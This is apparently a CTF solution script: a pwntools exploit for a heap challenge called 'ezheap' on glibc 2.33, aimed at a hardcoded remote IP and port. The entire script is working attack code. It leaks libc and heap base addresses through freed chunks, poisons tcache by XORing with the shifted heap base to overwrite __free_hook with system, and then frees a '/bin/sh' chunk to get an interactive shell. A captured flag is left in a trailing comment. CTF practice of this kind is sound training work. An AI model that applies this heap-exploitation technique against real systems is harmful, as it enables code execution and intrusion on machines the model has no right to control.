from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ezheap')
io = remote('129.211.173.64', 10002)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so')
elf = ELF('ezheap')


def add(size, content):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def edit(index, content):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendafter('Content: ', content)


def delete(index):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('Index: ', str(index))

def show(index):
    io.sendlineafter('>> ', '4')
    io.sendlineafter('Index: ', str(index))


def pwn():
    for _ in range(8):
        add(0x80, b'a' * 0x80)
    for i in range(8):
        delete(7 - i)
    show(0)
    libc_base = u64(io.recv(8)) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))
    show(7)
    heap_base = u64(io.recv(8)) << 12
    log.success('heap_base: ' + hex(heap_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    add(0x80, b'a' * 0x80)
    delete(1)
    edit(8, p64((heap_base >> 12) ^ (__free_hook - 0x10)) + b'\n')
    add(0x80, b'a' * 0x80)
    add(0x80, b'/bin/sh' + b'\x00' * 9 + p64(system) + b'\n')
    # gdb.attach(io)
    delete(10)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()


# flag{1ec61752948eb817e78b9a1b5810f326}
